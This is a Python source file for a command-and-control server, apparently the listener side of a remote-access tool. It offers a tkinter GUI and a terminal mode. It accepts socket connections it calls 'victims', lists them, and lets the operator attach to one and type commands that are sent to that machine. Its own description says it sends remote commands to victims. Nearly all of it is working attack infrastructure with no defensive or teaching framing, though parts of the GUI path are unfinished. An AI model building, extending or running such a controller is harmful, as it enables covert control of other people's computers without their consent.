import socket,sys,argparse,os,threading,select,time #core
import tkinter,customtkinter#graphic
#globals
inputs = []
outputs = []
victims = []
status = False
CurrentVictim = ''
helpbanner = '''
HELP BANNER
    commands:
        exit         closes this program
        help         to show this banner
        clear|cls    to clear the screen
        info         show information for this server
        victims      to show the connected victims
        start        start listening to victims
        stop         stop listening to victims
        set NAME VALUE   change a variable
'''
class App(customtkinter.CTk):
    def __init__(self,IP,PORT):
        super().__init__()
        self.IP = IP
        self.PORT = PORT
        self.inputs = []
        self.outputs = []
        self.status = False
        self.victims = []
        self.CurrentVictim = ''
        self.linetxtbox = 1
        self.ButtonsVictims = []
        self.CountButtons = 0
        # configure window
        self.geometry(f"{1100}x{580}")
        customtkinter.set_appearance_mode('dark')
        self.title('Command Center')
        self.geometry('1000x600')
        #self.grid_columnconfigure((0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10), weight=1)
        #self.grid_rowconfigure((0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10), weight=1)
        self.resizable(False,False)
      
        self.IPBOX = customtkinter.CTkLabel(self,text=f'IP:{IP}')
        self.PORTBOX = customtkinter.CTkLabel(self,text=f'PORT:{PORT}')
        self.Button_start_stop = customtkinter.CTkButton(self,text='START SERVER',command=self.ButtonStart)
        self.console_frame = customtkinter.CTkTextbox(self, corner_radius=5,width=500,height=450,state='disable')
        self.input_command = customtkinter.CTkEntry(self,width=500,height=5,placeholder_text='Type a command')
        self.ctk_textbox_scrollbar = customtkinter.CTkScrollbar(self,button_color="Blue")
        self.tabview = customtkinter.CTkTabview(self,width=180,height=470)
        self.input_command.bind('<Return>',self.add_element_callback)

        self.Button_start_stop.place(x=790,y=20)
        self.IPBOX.place(x=780,y=80)
        self.PORTBOX.place(x=870,y=80)
        self.console_frame.place(x=200,y=50)
        self.input_command.place(x=200,y=520)
        self.tabview.place(x=0,y=30)

        self.tabview.add('Victims')
        self.tabview.set('Victims')
    def ButtonStart(self):
        if self.Button_start_stop._text == 'START SERVER':
            self.status = True
            self.h1 = threading.Thread(target=self.Accepting)
            self.h1.start()
            self.console_frame.configure(state="normal")
            self.Button_start_stop.configure(text='STOP SERVER')
            self.console_frame.configure(state="disable")
            self.linetxtbox = self.linetxtbox + 1
        elif self.Button_start_stop._text == 'STOP SERVER':
            self.status = False
            self.console_frame.configure(state="normal")
            self.console_frame.insert(f'{self.linetxtbox}.0','[+] stopping listening to connections\n')
            self.console_frame.configure(state="disable")
            self.linetxtbox = self.linetxtbox + 1
            for s in inputs:
                s.close()
            self.inputs = []
            self.outputs = []
            self.victims = []
            for button in self.ButtonsVictims:
                button.destroy()
            self.ButtonsVictims = []
            self.CountButtons = 0
            self.Button_start_stop.configure(text='START SERVER')
        time.sleep(1)
    def add_element_callback(self,event):
        self.console_frame.configure(state="normal")
        self.console_frame.insert(f'{self.linetxtbox}.0','command << ' + self.input_command.get() + '\n')
        self.console_frame.configure(state="disable")
        self.linetxtbox = self.linetxtbox + 1
        if self.input_command.get() == 'clear' or self.input_command.get() == 'cls':
            self.console_frame.configure(state="normal")
            self.console_frame.delete('1.0',tkinter.END)
            self.console_frame.configure(state="disable")
            self.linetxtbox = self.linetxtbox + 1
        elif self.input_command.get() == 'help':
            self.console_frame.configure(state="normal")
            self.console_frame.insert(f'{self.linetxtbox}.0',helpbanner)
            self.console_frame.configure(state="disable")
            self.linetxtbox = self.linetxtbox + helpbanner.count('\n')
        elif self.input_command.get() == 'start':
            if self.status == False:
                self.status = True
                self.h1 = threading.Thread(target=self.Accepting)
                self.h1.start()
                self.Button_start_stop.configure(text='STOP SERVER')
            else:
                self.console_frame.configure(state="normal")
                self.console_frame.insert(f'{self.linetxtbox}.0','[-] The server is running\n')
                self.console_frame.configure(state="disable")
                self.linetxtbox = self.linetxtbox + 1
                self.Button_start_stop.configure(text='START SERVER')
        elif self.input_command.get() == 'stop':
            if self.status == True:
                self.status = False
                self.console_frame.configure(state="normal")
                self.console_frame.insert(f'{self.linetxtbox}.0','[+] stopping listening to connections\n')
                self.console_frame.configure(state="disable")
                self.linetxtbox = self.linetxtbox + 1
                for s in inputs:
                    s.close()
                self.inputs = []
                self.outputs = []
                self.victims = []
            else:
                self.console_frame.configure(state="normal")
                self.console_frame.insert(f'{self.linetxtbox}.0','[-] The server is not running\n')
                self.console_frame.configure(state="disable")
                self.linetxtbox = self.linetxtbox + 1
        elif self.input_command.get() == 'info':
                self.console_frame.configure(state="normal")
                self.console_frame.insert(f'{self.linetxtbox}.0',f'IP : {self.IP} ,PORT : {self.PORT} ')
                self.console_frame.configure(state="disable")
                self.linetxtbox = self.linetxtbox + 1
                if self.status == True:
                    self.console_frame.configure(state="normal")
                    self.console_frame.insert(f'{self.linetxtbox}.0',',STATUS: "Running"\n')
                    self.console_frame.configure(state="disable")
                    self.linetxtbox = self.linetxtbox + 1
                else:
                    self.console_frame.configure(state="normal")
                    self.console_frame.insert(f'{self.linetxtbox}.0',',STATUS: "Not Running"\n')
                    self.console_frame.configure(state="disable")
                    self.linetxtbox = self.linetxtbox + 1
        elif self.input_command.get() == 'exit':
                if self.status == False:
                    self.status = False
                    for s in self.inputs:
                        s.close()
                    self.inputs = []
                    self.outputs = []
                    self.victims = []
                    sys.exit()
                else:
                    self.console_frame.configure(state="normal")
                    self.console_frame.insert(f'{self.linetxtbox}.0','[-] The server is running\n')
                    self.console_frame.configure(state="disable")
                    self.linetxtbox = self.linetxtbox + 1
        else:
            self.console_frame.configure(state="normal")
            self.console_frame.insert(f'{self.linetxtbox}.0','[-] unknown command\n')
            self.console_frame.configure(state="disable")
            self.linetxtbox = self.linetxtbox + 1
        self.input_command.delete(0,10000)
    def Accepting(self):
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
            sock.setblocking(False)
            try :
                sock.bind((self.IP,int(self.PORT)))
            except:
                self.console_frame.configure(state="normal")
                self.console_frame.insert(f'{self.linetxtbox}.0','[-] ERROR. check your ip address or port\n')
                self.console_frame.configure(state="disable")
                self.linetxtbox = self.linetxtbox + 1
                self.status = False
                return
            self.console_frame.configure(state="normal")
            self.console_frame.insert(f'{self.linetxtbox}.0','[+] Starting to listen to connections Server started...\n')
            self.console_frame.configure(state="disable")
            self.linetxtbox = self.linetxtbox + 1
            sock.listen(5)
            self.inputs.append(sock)
            while self.status :
                readable, writable, exceptional = select.select(self.inputs,self.outputs,self.inputs,0.5)
                for s in readable:
                    if s is sock:
                        try:
                            conn, addr = s.accept()
                        except OSError:
                            continue
                        self.console_frame.configure(state="normal")
                        self.console_frame.insert(f'{self.linetxtbox}.0',f'connection received from {addr}\n')
                        self.console_frame.configure(state="disable")
                        self.linetxtbox = self.linetxtbox + 1
                        self.inputs.append(conn)
                        self.victims.append([conn,addr])
                        if self.CountButtons < 6:
                            button = customtkinter.CTkButton(self.tabview.tab('Victims'),text=f'{addr}')
                            button.pack(padx=20, pady=20)
                            self.ButtonsVictims.append(button)
                            self.CountButtons = self.CountButtons + 1
                    elif CurrentVictim is s:
                        try:
                            data = s.recv(1024)
                        except ConnectionResetError:
                            self.inputs.remove(s)
                            for socklist in self.victims:
                                for l in socklist:
                                    if l is s:
                                        self.console_frame.configure(state="normal")
                                        self.console_frame.insert(f'{self.linetxtbox}.0',f'a client has disconnected. {socklist[1]}\n')
                                        self.console_frame.configure(state="disable")
                                        self.linetxtbox = self.linetxtbox + 1
                                        for button in self.ButtonsVictims:
                                            if button._text == socklist[1]:
                                                self.ButtonsVictims.remove(button)
                                                button.destroy()
                                                self.CountButtons = self.CountButtons - 1
                                                break
                                        self.victims.remove(socklist)
                                        break                      
                            s.close()
                            continue
                        if data:
                            print(data.decode(errors='ignore'))
                        else:
                            self.inputs.remove(s)
                            for socklist in self.victims:
                                for l in socklist:
                                    if l is s:
                                        self.console_frame.configure(state="normal")
                                        self.console_frame.insert(f'{self.linetxtbox}.0',f'a client has disconnected. {socklist[1]}\n')
                                        self.console_frame.configure(state="disable")
                                        self.linetxtbox = self.linetxtbox + 1
                                        for button in self.ButtonsVictims:
                                            if button._text == socklist[1]:
                                                self.ButtonsVictims.remove(button)
                                                button.destroy()
                                                self.CountButtons = self.CountButtons - 1
                                                break
                                        self.victims.remove(socklist) 
                                        break                      
                            s.close()
                    else:
                        try:
                            data = s.recv(1024)
                        except ConnectionResetError:
                            self.inputs.remove(s)
                            for socklist in self.victims:
                                for l in socklist:
                                    if l is s:
                                        self.console_frame.configure(state="normal")
                                        self.console_frame.insert(f'{self.linetxtbox}.0',f'a client has disconnected. {socklist[1]}\n')
                                        self.console_frame.configure(state="disable")
                                        self.linetxtbox = self.linetxtbox + 1
                                        for button in self.ButtonsVictims:
                                            if button._text == str(socklist[1]):
                                                self.ButtonsVictims.remove(button)
                                                button.destroy()
                                                self.CountButtons = self.CountButtons - 1
                                                break
                                        self.victims.remove(socklist) 
                                        break                      
                            s.close()
                            continue
                        if data:
                            pass
                        else:
                            self.inputs.remove(s)
                            for socklist in self.victims:
                                for l in socklist:
                                    if l is s:
                                        self.console_frame.configure(state="normal")
                                        self.console_frame.insert(f'{self.linetxtbox}.0',f'a client has disconnected. {socklist[1]}\n')
                                        self.console_frame.configure(state="disable")
                                        self.linetxtbox = self.linetxtbox + 1
                                        for button in self.ButtonsVictims:
                                            if button._text == socklist[1]:
                                                self.ButtonsVictims.remove(button)
                                                button.destroy()
                                                self.CountButtons = self.CountButtons - 1
                                                break
                                        self.victims.remove(socklist) 
                                        break                      
                            s.close()

def accepting(ip,port):
    global inputs,outputs,status,victims,CurrentVictim
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
        sock.setblocking(False)

        try :
            sock.bind((ip,int(port)))
        except:
            print('\n[-] ERROR. check your ip address or port')
            status = False
            return
        print('\n[+] Starting to listen to connections\nServer started...')
        sock.listen(5)

        inputs.append(sock)
        while status :
            readable, writable, exceptional = select.select(inputs,outputs,inputs,0.5)
            for s in readable:
                if s is sock:
                    try:
                        conn, addr = s.accept()
                    except OSError:
                       continue
                    print(f'\nconnection received from {addr}')
                    inputs.append(conn)
                    victims.append([conn,addr])
                elif CurrentVictim is s:
                    try:
                        data = s.recv(1024)
                    except ConnectionResetError:
                        inputs.remove(s)
                        for socklist in victims:
                            for l in socklist:
                                if l is s:
                                    print(f'\na client has disconnected. {socklist[1]}')
                                    victims.remove(socklist) 
                                    break                      
                        s.close()
                        continue
                    if data:
                        print(data.decode(errors='ignore'))
                    else:
                        inputs.remove(s)
                        for socklist in victims:
                            for l in socklist:
                                if l is s:
                                    print(f'\na client has disconnected. {socklist[1]}')
                                    victims.remove(socklist) 
                                    break                      
                        s.close()
                else:
                    try:
                        data = s.recv(1024)
                    except ConnectionResetError:
                        inputs.remove(s)
                        for socklist in victims:
                            for l in socklist:
                                if l is s:
                                    print(f'\na client has disconnected. {socklist[1]}')
                                    victims.remove(socklist) 
                                    break                      
                        s.close()
                        continue
                    if data:
                        pass
                    else:
                        inputs.remove(s)
                        for socklist in victims:
                            for l in socklist:
                                if l is s:
                                    print(f'\na client has disconnected. {socklist[1]}')
                                    victims.remove(socklist) 
                                    break                      
                        s.close()

def TerminalMode(address,port):
    global status,inputs,outputs,victims,CurrentVictim,helpbanner
    IP = address
    PORT = port
    while True:
        try:
            command = input('command >> ')
            if command == 'exit':
                if status == False:
                    sys.exit()
                else:
                    print('[-] The server is running')
            elif command == 'help':
                print(helpbanner)
            elif command == 'clear' or command == 'cls':
                if os.name == 'posix':
                    os.system('clear')
                else:
                    os.system('cls')
            elif command == 'info':
                print(f'IP : {IP} ,PORT : {PORT}',end='')
                if status == True:
                    print(' ,STATUS: "Running"')
                else:
                    print(' ,STATUS: "not Running"')
            elif command.split()[0] == 'set':
                if len(command.split()) < 3:
                    print('[-] missing parameters')
                elif status == True:
                    print('[-] The server is running')
                elif command.split()[1] == 'IP':
                    IP = command.split()[2]
                elif command.split()[1] == 'PORT':
                    PORT = command.split()[2]
                else:
                    print('[-] unknown variable')
            elif command == 'victims':
                for socklist in victims:
                    print(socklist[1])
            elif command == 'start':
                if status == False:
                    status = True
                    h1 = threading.Thread(target=accepting,args=(IP,PORT))
                    h1.start()
                else:
                    print('[-] The server is running')
            elif command == 'stop':
                if status == True:
                    status = False
                    print('[+] stopping listening to connections')
                    for s in inputs:
                        s.close()
                    inputs = []
                    outputs = []
                    victims = []
                else:
                    print('[-] The server is not running')
            elif command.split()[0] == 'connect':
                connect = False
                if len(command.split()) < 3:
                    print('[-] missing parameters')
                    continue
                if status == False:
                    print('[-] The server is not running')
                    continue
                for addr in victims:
                    if command.split()[1] == addr[1][0] and command.split()[2] == str(addr[1][1]):
                        CurrentVictim = addr[0]
                        connect = True
                        CurrentVictim.send(b'ok')
                        while True:
                            msg = input(f'{addr[1]} << ')
                            time.sleep(1)
                            if msg == 'exit':
                                CurrentVictim=''
                                break
                            try:
                                addr[0].send(bytes(msg,'utf-8'))
                            except:
                                pass
                if connect == False:   
                    print('[-] unknown victim')
                connect = False
            elif command.split()[0] == 'print':
                if len(command.split()) < 2:
                    print('[-] missing parameters')
                elif command.split()[1] == 'inputs':
                    print(inputs)
                elif command.split()[1] == 'status':
                    print(status)
                elif command.split()[1] == 'outputs':
                    print(outputs)
                elif command.split()[1] == 'CurrentVictim':
                    print(CurrentVictim)
                else:
                    print('[-] Unknown variable')
            else:
                print("[-] unknown command")
        except IndexError:
            pass


# Create the parser
parser = argparse.ArgumentParser(
                    prog = sys.argv[0],
                    description = 'receives connections from victims to send remote commands to them')
# Add an argument
parser.add_argument('-m','--mode',help='there are two graphic or terminal modes',required=True)
parser.add_argument('-a','--address')
parser.add_argument('-p','--port')
# Parse the argument
args = parser.parse_args()

if args.mode == 'graphic':
    app = App(args.address,args.port)
    app.mainloop()
elif args.mode == 'terminal':
    TerminalMode(args.address,args.port)
else:
    print('[-] Unknown Mode')

